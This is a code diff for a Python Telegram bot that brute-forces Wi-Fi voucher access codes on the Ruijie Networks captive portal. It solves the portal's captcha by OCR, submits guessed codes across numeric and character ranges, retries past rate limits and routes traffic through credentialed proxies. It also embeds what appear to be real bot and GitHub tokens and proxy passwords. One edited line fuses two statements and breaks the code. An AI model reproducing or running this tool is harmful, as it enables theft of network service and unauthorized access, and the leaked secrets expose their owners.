@@ -6,20 +6,15 @@ import cv2
 import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
-import os
-import sys
 
 # ==================== CONFIGURATION ====================
 
-BOT_TOKEN = "8891783896:AAFghnzZ-MJDUAxBq8J223cP_geu8aXVKjw"
-GITHUB_TOKEN = os.environ.get("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")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8891783896:AAFghnzZ-MJDUAxBq8J223cP_geu8aXVKjw")
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "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")
 REPO_OWNER = "kyaw185562-hue"
 REPO_NAME = "bot-data"
 
-ADMINS = [
-    "8171308760"
-]
-
+ADMINS = ["8171308760"]
 ADMIN_USERNAME = "@UKhant709"
 
 def is_admin(user_id):
@@ -29,7 +24,6 @@ PROXY_LIST = [
     "http://xiolnvcj:8qp744606gfj@191.96.254.138:6185",
     "http://xiolnvcj:8qp744606gfj@45.38.107.97:6014",
 ]
-
 
 _proxy_index = 0
 def get_next_proxy():
@@ -70,7 +64,7 @@ async def web_server():
     app.router.add_get('/', handle)
     runner = web.AppRunner(app)
     await runner.setup()
-    port = int(os.environ.get('BOT_PORT', 8099))
+    port = int(os.environ.get('PORT', 8099))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
 
@@ -773,8 +767,7 @@ def check_key_expiration(expiration_time):
             if expiry == "9999-12-31T23:59:59Z":
                 return True
             exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
-            return datetime.now(timezone.utc) < exp_time
-        mm, hh, dd, MM, yyyy = map(
+            return datetime.now(timezone.utc) < exp_time        mm, hh, dd, MM, yyyy = map(
             int,
             expiration_time.split('-')
         )
@@ -1222,14 +1215,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
     
     if mode in ["6", "7", "8"]:
         total = 10 ** int(mode)
-    elif mode == "9":
-        total = None
-    elif mode in ["mixed", "mixed8", "mixed9"]:
-        total = None
-    elif mode in ["ascii-lower", "ascii-lower9"]:
-        total = None
-    elif mode == "all":
-        total = None
     else:
         total = None
     
@@ -1349,13 +1334,10 @@ async def get_session_id(session, session_url, previous_session_id=None):
         'sec-fetch-site': 'same-origin',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     
-    proxy = None
-    
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
+        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
             response = str(req.url)
             session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             if session_id:
@@ -1382,67 +1364,59 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     response = None
     
     for _attempt in range(3):
-        timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-            session_id = await get_session_id(task_session, session_url, None)
-            if not session_id:
-                return
-            auth_code = None
-            for _ in range(8):
-                try:
-                    image = await Captcha_Image(task_session, session_id)
-                    text = await Captcha_Text(image)
-                    if not text:
-                        continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
-                    if verified:
-                        auth_code = text
-                        break
-                except Exception as e:
-                    print(f"[perform_check] captcha error: {e}")
-            if not auth_code:
-                return
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": "portal-as.ruijienetworks.com",
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "content-type": "application/json",
-                "origin": "https://portal-as.ruijienetworks.com",
-                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Geo) Chrome/139.0.0.0 Mobile Safari/537.36",
-            }
-            
-            proxy = None
-            
+        task_session = session  # global session ကို သုံးပါ
+        session_id = await get_session_id(task_session, session_url, None)
+        if not session_id:
+            return
+        auth_code = None
+        for _ in range(8):
             try:
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
-                    response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
+                image = await Captcha_Image(task_session, session_id)
+                text = await Captcha_Text(image)
+                if not text:
+                    continue
+                verified = await Varify_Captcha(task_session, session_id, text)
+                if verified:
+                    auth_code = text
+                    break
             except Exception as e:
-                print(f"[perform_check] error: {e}")
+                print(f"[perform_check] captcha error: {e}")
+        if not auth_code:
+            return
+        if not recheck:
+            current_task = scan_tasks.get(chat_id)
+            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                 return
+        data = {
+            "accessCode": code,
+            "sessionId": session_id,
+            "apiVersion": 1,
+            "authCode": auth_code,
+        }
+        headers = {
+            "authority": "portal-as.ruijienetworks.com",
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": "application/json",
+            "origin": "https://portal-as.ruijienetworks.com",
+            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
+            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+        }
+        
+        try:
+            async with task_session.post(post_url, json=data, headers=headers) as req:
+                response = await req.text()
+                resp_json = json.loads(response)
+                print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
+        except Exception as e:
+            print(f"[perform_check] error: {e}")
+            return
         if response and 'request limited' in response:
             print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
             continue
@@ -1551,34 +1525,27 @@ async def Code_Expires_Date(active_id):
         'x-requested-with': 'XMLHttpRequest',
     }
     
-    timeout = aiohttp.ClientTimeout(total=10)
-    async with aiohttp.ClientSession(
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=timeout
-    ) as fresh_session:
-        for url in paths:
-            try:
-                async with fresh_session.get(url, headers=headers) as req:
-                    if req.status == 200:
-                        respond = await req.json()
-                        if respond.get('success'):
-                            result = respond.get('result', {})
-                            raw_minutes = result.get('totalMinutes')
-                            if raw_minutes is None:
-                                raw_minutes = result.get('remainingMinutes')
+    for url in paths:
+        try:
+            async with session.get(url, headers=headers) as req:
+                if req.status == 200:
+                    respond = await req.json()
+                    if respond.get('success'):
+                        result = respond.get('result', {})
+                        raw_minutes = result.get('totalMinutes')
+                        if raw_minutes is None:
+                            raw_minutes = result.get('remainingMinutes')
+                        
+                        if raw_minutes is None:
+                            raw_minutes = 'Unknown'
                             
-                            if raw_minutes is None:
-                                raw_minutes = 'Unknown'
-                                
-                            profile_name = result.get('profileName', 'Unknown')
-                            totaltime = Minute_to_Hour(raw_minutes)
-                            display = f"🃏 Plan: {profile_name} | ⏰ Time: {totaltime}"
-                            return display, raw_minutes
-            except Exception as e:
-                print(f"[Code_Expires_Date] path error: {e}")
-                continue
+                        profile_name = result.get('profileName', 'Unknown')
+                        totaltime = Minute_to_Hour(raw_minutes)
+                        display = f"🃏 Plan: {profile_name} | ⏰ Time: {totaltime}"
+                        return display, raw_minutes
+        except Exception as e:
+            print(f"[Code_Expires_Date] path error: {e}")
+            continue
                 
     return "🃏 Plan: Unknown | ⏰ Time: Unknown", 'Unknown'
 
@@ -1618,9 +1585,7 @@ async def Captcha_Image(session, session_id):
         '_t': str(time.time()),
     }
     
-    proxy = None
-    
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
+    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
         return await req.read()
 
 async def Varify_Captcha(session, session_id, text):
@@ -1644,9 +1609,7 @@ async def Varify_Captcha(session, session_id, text):
         'authCode': text,
     }
     
-    proxy = None
-    
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
+    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
         data = await req.json()
         print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
         if data.get("success") == True:
@@ -1657,7 +1620,7 @@ async def start_polling():
     backoff = 5
     while True:
         try:
-            await bot.infinity_polling(timeout=20, request_timeout=20)
+            await bot.infinity_polling(timeout=40, request_timeout=40, non_stop=True)
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
             print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
@@ -1670,13 +1633,13 @@ async def start_polling():
 
 async def main():
     global session, _connector
-    timeout = aiohttp.ClientTimeout(total=30)
+    timeout = aiohttp.ClientTimeout(total=60)
     _connector = aiohttp.TCPConnector(
-    limit=200000,
-    limit_per_host=100000,
-    ttl_dns_cache=300,
-    ssl=False
-)
+        limit=500,
+        limit_per_host=100,
+        ttl_dns_cache=300,
+        ssl=False
+    )
     session = aiohttp.ClientSession(
         timeout=timeout,
         connector=_connector,
